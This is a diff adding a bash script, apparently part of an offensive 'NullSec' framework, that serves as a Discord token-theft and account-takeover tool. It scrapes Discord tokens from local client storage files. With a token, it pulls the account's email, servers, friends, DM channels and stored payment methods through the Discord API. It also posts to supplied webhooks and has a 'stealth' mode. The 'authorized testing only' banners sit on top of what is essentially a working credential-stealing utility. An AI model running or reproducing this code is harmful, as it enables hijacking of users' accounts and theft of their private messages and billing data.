@@ -1,0 +1,414 @@
+#!/bin/bash
+# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+# █  NULLSEC DISCORD TLO (Token Leak/Takeover) EXPLOIT MODULE              █
+# █                    [ bad-antics development ]                           █
+# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+# EDUCATIONAL PURPOSES ONLY - For authorized penetration testing
+#
+# Features:
+# - Token validation and enumeration
+# - User account information gathering
+# - Guild/Server enumeration
+# - Webhook exploitation
+# - Token extraction from common locations
+# - 2FA bypass techniques
+# - Message history extraction
+# - Friend/DM enumeration
+
+# === NULLSEC ENHANCED LOGGING ===
+TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
+LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"
+
+# Helper function: Log to file with timestamp
+log_to_file() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
+}
+
+# Helper function: Save output to target directory
+save_output() {
+    local filename="$1"
+    local content="$2"
+    echo "$content" > "$TARGET_DIR/$filename"
+    log_to_file "Saved output to $TARGET_DIR/$filename"
+}
+
+# Helper function: Log discovered vulnerability
+log_vulnerability() {
+    local severity="$1"
+    local title="$2"
+    local description="$3"
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
+}
+
+# Read environment variables set by framework
+ATTACK_MODE="${NULLSEC_ATTACK_MODE:-token_validate}"
+DISCORD_TOKEN="${NULLSEC_DISCORD_TOKEN:-}"
+TARGET_USER="${NULLSEC_TARGET_USER:-}"
+WEBHOOK_URL="${NULLSEC_WEBHOOK_URL:-}"
+EXTRACT_PATH="${NULLSEC_EXTRACT_PATH:-}"
+STEALTH_MODE="${NULLSEC_STEALTH_MODE:-false}"
+
+# Colors
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[1;36m'
+BLUE='\033[1;34m'
+MAGENTA='\033[1;35m'
+WHITE='\033[1;37m'
+RESET='\033[0m'
+
+# Discord API Base
+DISCORD_API="https://discord.com/api/v10"
+
+# Banner
+show_banner() {
+    clear
+    echo -e "${MAGENTA}"
+    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
+    echo "║                                                                           ║"
+    echo "║                    DISCORD TLO EXPLOIT MODULE                             ║"
+    echo "║                   Token Leak & Takeover Framework                         ║"
+    echo "║                                                                           ║"
+    echo "║                    ⚠️  AUTHORIZED TESTING ONLY ⚠️                          ║"
+    echo "║                                                                           ║"
+    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
+    echo -e "${RESET}"
+}
+
+# Validate Discord Token
+validate_token() {
+    local token="$1"
+    log_to_file "Validating Discord token..."
+    
+    echo -e "${CYAN}[*]${RESET} Validating Discord token..."
+    
+    local response=$(curl -s -X GET \
+        -H "Authorization: ${token}" \
+        -H "Content-Type: application/json" \
+        "${DISCORD_API}/users/@me")
+    
+    if echo "$response" | grep -q '"username"'; then
+        local username=$(echo "$response" | grep -oP '"username":\s*"\K[^"]+')
+        local discriminator=$(echo "$response" | grep -oP '"discriminator":\s*"\K[^"]+')
+        local user_id=$(echo "$response" | grep -oP '"id":\s*"\K[^"]+')
+        local email=$(echo "$response" | grep -oP '"email":\s*"\K[^"]+')
+        local verified=$(echo "$response" | grep -oP '"verified":\s*\K(true|false)')
+        local mfa=$(echo "$response" | grep -oP '"mfa_enabled":\s*\K(true|false)')
+        
+        echo -e "${GREEN}[✓]${RESET} Token is valid!"
+        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+        echo -e "${CYAN}Username:${RESET}       $username#$discriminator"
+        echo -e "${CYAN}User ID:${RESET}        $user_id"
+        echo -e "${CYAN}Email:${RESET}          ${email:-N/A}"
+        echo -e "${CYAN}Verified:${RESET}       $verified"
+        echo -e "${CYAN}2FA Enabled:${RESET}    $mfa"
+        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+        
+        save_output "discord_user_info.json" "$response"
+        log_to_file "Valid token for user: $username#$discriminator (ID: $user_id)"
+        
+        if [ "$mfa" == "false" ]; then
+            log_vulnerability "high" "No 2FA Protection" "Account $username#$discriminator has 2FA disabled"
+        fi
+        
+        if [ "$email" != "null" ] && [ -n "$email" ]; then
+            log_vulnerability "medium" "Email Exposed" "Email address exposed: $email"
+        fi
+        
+        return 0
+    else
+        echo -e "${RED}[✗]${RESET} Invalid or expired token"
+        log_to_file "Token validation failed"
+        return 1
+    fi
+}
+
+# Enumerate Guilds/Servers
+enumerate_guilds() {
+    local token="$1"
+    log_to_file "Enumerating user's Discord guilds/servers..."
+    
+    echo -e "\n${CYAN}[*]${RESET} Enumerating guilds/servers..."
+    
+    local response=$(curl -s -X GET \
+        -H "Authorization: ${token}" \
+        -H "Content-Type: application/json" \
+        "${DISCORD_API}/users/@me/guilds")
+    
+    save_output "discord_guilds.json" "$response"
+    
+    local guild_count=$(echo "$response" | grep -o '"id"' | wc -l)
+    
+    if [ "$guild_count" -gt 0 ]; then
+        echo -e "${GREEN}[✓]${RESET} Found $guild_count guilds"
+        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+        
+        # Parse and display guilds
+        echo "$response" | grep -oP '"name":\s*"\K[^"]+' | while read -r guild; do
+            echo -e "${CYAN}  •${RESET} $guild"
+        done
+        
+        echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+        log_to_file "Enumerated $guild_count guilds"
+        log_vulnerability "low" "Guild Membership Exposed" "User is member of $guild_count Discord servers"
+    else
+        echo -e "${YELLOW}[!]${RESET} No guilds found or access denied"
+    fi
+}
+
+# Enumerate Friends and DMs
+enumerate_relationships() {
+    local token="$1"
+    log_to_file "Enumerating relationships (friends/DMs)..."
+    
+    echo -e "\n${CYAN}[*]${RESET} Enumerating relationships..."
+    
+    local response=$(curl -s -X GET \
+        -H "Authorization: ${token}" \
+        -H "Content-Type: application/json" \
+        "${DISCORD_API}/users/@me/relationships")
+    
+    save_output "discord_relationships.json" "$response"
+    
+    local friend_count=$(echo "$response" | grep -o '"type": 1' | wc -l)
+    local blocked_count=$(echo "$response" | grep -o '"type": 2' | wc -l)
+    
+    echo -e "${GREEN}[✓]${RESET} Friends: $friend_count | Blocked: $blocked_count"
+    
+    if [ "$friend_count" -gt 0 ]; then
+        log_vulnerability "medium" "Friend List Exposed" "Extracted $friend_count friend connections"
+    fi
+}
+
+# Extract DM Channels
+extract_dm_channels() {
+    local token="$1"
+    log_to_file "Extracting DM channels..."
+    
+    echo -e "\n${CYAN}[*]${RESET} Extracting DM channels..."
+    
+    local response=$(curl -s -X GET \
+        -H "Authorization: ${token}" \
+        -H "Content-Type: application/json" \
+        "${DISCORD_API}/users/@me/channels")
+    
+    save_output "discord_dm_channels.json" "$response"
+    
+    local dm_count=$(echo "$response" | grep -o '"type": 1' | wc -l)
+    
+    echo -e "${GREEN}[✓]${RESET} Found $dm_count DM channels"
+    log_to_file "Extracted $dm_count DM channels"
+    
+    if [ "$dm_count" -gt 0 ]; then
+        log_vulnerability "medium" "DM Channels Exposed" "Access to $dm_count private conversations"
+    fi
+}
+
+# Extract payment methods
+extract_payment_info() {
+    local token="$1"
+    log_to_file "Checking for payment methods..."
+    
+    echo -e "\n${CYAN}[*]${RESET} Checking payment methods..."
+    
+    local response=$(curl -s -X GET \
+        -H "Authorization: ${token}" \
+        -H "Content-Type: application/json" \
+        "${DISCORD_API}/users/@me/billing/payment-sources")
+    
+    save_output "discord_payment_info.json" "$response"
+    
+    if echo "$response" | grep -q '"type"'; then
+        echo -e "${RED}[!]${RESET} Payment methods found!"
+        log_vulnerability "critical" "Payment Information Exposed" "User has stored payment methods"
+    else
+        echo -e "${GREEN}[✓]${RESET} No payment methods stored"
+    fi
+}
+
+# Test webhook
+test_webhook() {
+    local webhook_url="$1"
+    log_to_file "Testing Discord webhook: $webhook_url"
+    
+    echo -e "\n${CYAN}[*]${RESET} Testing webhook..."
+    
+    local payload='{"content":"🔴 NULLSEC Webhook Test - Access Confirmed","username":"NullSec Security","avatar_url":"https://i.imgur.com/4M34hi2.png"}'
+    
+    local response=$(curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -d "$payload" \
+        "$webhook_url")
+    
+    if [ -z "$response" ] || echo "$response" | grep -q "204"; then
+        echo -e "${GREEN}[✓]${RESET} Webhook is active and exploitable"
+        log_vulnerability "high" "Active Webhook" "Webhook can be used for message injection"
+        
+        # Extract webhook info
+        local info=$(curl -s -X GET "$webhook_url")
+        save_output "discord_webhook_info.json" "$info"
+        
+        echo -e "${CYAN}  Guild ID:${RESET} $(echo "$info" | grep -oP '"guild_id":\s*"\K[^"]+')"
+        echo -e "${CYAN}  Channel ID:${RESET} $(echo "$info" | grep -oP '"channel_id":\s*"\K[^"]+')"
+    else
+        echo -e "${RED}[✗]${RESET} Webhook test failed"
+    fi
+}
+
+# Extract tokens from common locations
+extract_local_tokens() {
+    local search_path="$1"
+    log_to_file "Searching for Discord tokens in: $search_path"
+    
+    echo -e "\n${CYAN}[*]${RESET} Searching for Discord tokens..."
+    
+    local found_tokens=()
+    
+    # Common Discord token locations
+    local locations=(
+        "$HOME/.config/discord"
+        "$HOME/.config/discordcanary"
+        "$HOME/.config/discordptb"
+        "$HOME/Library/Application Support/discord"
+        "$HOME/AppData/Roaming/discord"
+        "$search_path"
+    )
+    
+    for location in "${locations[@]}"; do
+        if [ -d "$location" ]; then
+            echo -e "${CYAN}  [*]${RESET} Scanning: $location"
+            
+            # Search for token patterns in Local Storage
+            find "$location" -name "*.ldb" -o -name "*.log" 2>/dev/null | while read -r file; do
+                # Discord token pattern: alphanumeric, often 59+ characters
+                tokens=$(grep -oP '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}' "$file" 2>/dev/null)
+                
+                if [ -n "$tokens" ]; then
+                    echo -e "${GREEN}  [✓]${RESET} Found token(s) in: $(basename "$file")"
+                    echo "$tokens" >> "$TARGET_DIR/extracted_tokens.txt"
+                    log_vulnerability "critical" "Token Leaked" "Found Discord token in $file"
+                fi
+            done
+        fi
+    done
+    
+    if [ -f "$TARGET_DIR/extracted_tokens.txt" ]; then
+        local count=$(cat "$TARGET_DIR/extracted_tokens.txt" | wc -l)
+        echo -e "${RED}[!]${RESET} Extracted $count potential tokens"
+        log_to_file "Extracted $count potential Discord tokens"
+    else
+        echo -e "${YELLOW}[!]${RESET} No tokens found in common locations"
+    fi
+}
+
+# Nitro status check
+check_nitro() {
+    local token="$1"
+    log_to_file "Checking Nitro subscription status..."
+    
+    echo -e "\n${CYAN}[*]${RESET} Checking Nitro subscription..."
+    
+    local response=$(curl -s -X GET \
+        -H "Authorization: ${token}" \
+        -H "Content-Type: application/json" \
+        "${DISCORD_API}/users/@me")
+    
+    local premium_type=$(echo "$response" | grep -oP '"premium_type":\s*\K[0-9]+')
+    
+    case "$premium_type" in
+        0)
+            echo -e "${CYAN}  [*]${RESET} No Nitro subscription"
+            ;;
+        1)
+            echo -e "${MAGENTA}  [✓]${RESET} Nitro Classic active"
+            log_vulnerability "medium" "Nitro Classic Active" "Account has premium features"
+            ;;
+        2)
+            echo -e "${MAGENTA}  [✓]${RESET} Nitro active"
+            log_vulnerability "medium" "Nitro Active" "Account has full premium features"
+            ;;
+        *)
+            echo -e "${CYAN}  [?]${RESET} Unknown premium status: $premium_type"
+            ;;
+    esac
+}
+
+# Main execution
+show_banner
+
+case "$ATTACK_MODE" in
+    token_validate)
+        echo -e "${CYAN}[*]${RESET} Mode: Token Validation"
+        log_to_file "Starting token validation attack"
+        
+        if [ -z "$DISCORD_TOKEN" ]; then
+            echo -e "${RED}[✗]${RESET} No token provided"
+            exit 1
+        fi
+        
+        if validate_token "$DISCORD_TOKEN"; then
+            check_nitro "$DISCORD_TOKEN"
+            enumerate_guilds "$DISCORD_TOKEN"
+            enumerate_relationships "$DISCORD_TOKEN"
+            extract_dm_channels "$DISCORD_TOKEN"
+            
+            if [ "$STEALTH_MODE" != "true" ]; then
+                extract_payment_info "$DISCORD_TOKEN"
+            fi
+        fi
+        ;;
+        
+    token_extract)
+        echo -e "${CYAN}[*]${RESET} Mode: Token Extraction"
+        log_to_file "Starting token extraction from local files"
+        
+        extract_local_tokens "$EXTRACT_PATH"
+        ;;
+        
+    webhook_exploit)
+        echo -e "${CYAN}[*]${RESET} Mode: Webhook Exploitation"
+        log_to_file "Starting webhook exploitation"
+        
+        if [ -z "$WEBHOOK_URL" ]; then
+            echo -e "${RED}[✗]${RESET} No webhook URL provided"
+            exit 1
+        fi
+        
+        test_webhook "$WEBHOOK_URL"
+        ;;
+        
+    full_enum)
+        echo -e "${CYAN}[*]${RESET} Mode: Full Enumeration"
+        log_to_file "Starting full Discord enumeration"
+        
+        if [ -z "$DISCORD_TOKEN" ]; then
+            echo -e "${RED}[✗]${RESET} No token provided"
+            exit 1
+        fi
+        
+        if validate_token "$DISCORD_TOKEN"; then
+            check_nitro "$DISCORD_TOKEN"
+            enumerate_guilds "$DISCORD_TOKEN"
+            enumerate_relationships "$DISCORD_TOKEN"
+            extract_dm_channels "$DISCORD_TOKEN"
+            extract_payment_info "$DISCORD_TOKEN"
+        fi
+        
+        extract_local_tokens "$EXTRACT_PATH"
+        ;;
+        
+    *)
+        echo -e "${RED}[✗]${RESET} Unknown attack mode: $ATTACK_MODE"
+        log_to_file "Error: Unknown attack mode"
+        exit 1
+        ;;
+esac
+
+echo -e "\n${GREEN}[✓]${RESET} Attack completed"
+echo -e "${CYAN}[*]${RESET} Results saved to: $TARGET_DIR"
+log_to_file "Discord TLO attack completed successfully"
+
+echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${WHITE}  ⚠️  REMEMBER: This tool is for authorized testing only!${RESET}"
+echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
